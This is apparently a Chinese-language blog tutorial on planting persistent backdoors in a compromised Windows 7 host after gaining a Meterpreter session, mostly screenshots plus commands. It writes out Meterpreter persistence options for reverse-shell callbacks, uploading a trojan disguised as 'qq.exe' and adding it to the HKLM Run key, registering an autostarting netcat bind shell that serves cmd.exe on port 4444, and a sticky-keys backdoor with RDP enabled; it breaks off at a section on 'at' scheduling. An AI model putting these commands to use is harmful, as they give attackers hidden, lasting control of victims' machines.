## **后门植入**

### 1\. 持续化后门

在提权后的meterpreter下执行persistence命令

[![wps1](https://image.3001.net/images/20201116/1605504958.jpg!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201111110203142-999548479.jpg)

run persistence -i 5 -U -X

-A 自动匹配监听器连接用户

-S 系统开启的时候作为服务自动运行，反弹shell

-U 在用户登入的时候反弹shell

-X 系统开启的时候返回shell

-i 间隔几秒中反弹

-p 指定监听的端口

-r 设定回连的ip  
  
---  
  
  

[![wps2](https://image.3001.net/images/20201116/1605504959.jpg!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201111110203945-2000195175.jpg)

  

[![wps4](https://image.3001.net/images/20201116/1605504960.jpg!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201111110205229-971905770.jpg)

win7重启后成功连接

[![wps5](https://image.3001.net/images/20201116/1605504960.jpg!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201111110206033-1183000265.jpg)

  

### 2\. 手动上传木马并加入注册表中

[![wps6](https://image.3001.net/images/20201116/1605504961.jpg!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201111110206761-287520575.jpg)

[![wps7](https://image.3001.net/images/20201116/1605504962.jpg!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201111110207547-883751300.jpg)

[![wps8](https://image.3001.net/images/20201116/1605504963.jpg!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201111110208223-132253253.jpg)

重启后登陆自动连接

[![wps9](https://image.3001.net/images/20201116/1605504963.jpg!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201111110208916-1855340291.jpg)

meterpreter > upload qq.exe c: 将木马文件上传到目标机的C盘（可以隐蔽一些）

reg setval -k
'HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run' -v shell -d
'c:\qq.exe' -f 将木马文件写入注册表

reg queryval -k
'HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run' -v shell 查看  
  
---  
  
  

## 3\. 上传nc

[![wps10](https://image.3001.net/images/20201116/1605504964.jpg!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201111110209547-1067521510.jpg)

[![wps11](https://image.3001.net/images/20201116/1605504965.jpg!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201111110210288-512508928.jpg)

win7重启后自动开启nc.exe

[![wps12](https://image.3001.net/images/20201116/1605504966.jpg!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201111110210987-783973092.jpg)[![wps13](https://image.3001.net/images/20201116/1605504966.jpg!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201111110211710-356677252.jpg)

upload nc.exe c:

reg add HKLM\software\microsoft\windows\currentversion\run /v shell /d
"C:\nc.exe -l -v -v -p 4444 -e c:\windows\system32\cmd.exe" cmd下运行  
  
---  
  
  

### 4\. 开3389-->shift后门-->远程登入

[![wps14](https://image.3001.net/images/20201116/1605504967.jpg!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201111110212566-2057021138.jpg)

[![wps15](https://image.3001.net/images/20201116/1605504968.jpg!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201111110213202-976878573.jpg)

[![wps16](https://image.3001.net/images/20201116/1605504969.jpg!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201111110213928-924509007.jpg)

按5次shift调出改过的粘滞键后门

run post/windows/manage/enable_rdp 开启3389端口

rdesktop 192.168.227.128 远程登录  
  
---  
  
  

### 5\. at调用

[![wps18](https://image.3001.net/images/20201116/1605504970.jpg!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201111110215324-54647181.jpg)[![wps19](https://image.3001.net/images/20201116/1605504971.jpg!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201111110215975-1962739437.jpg)

  

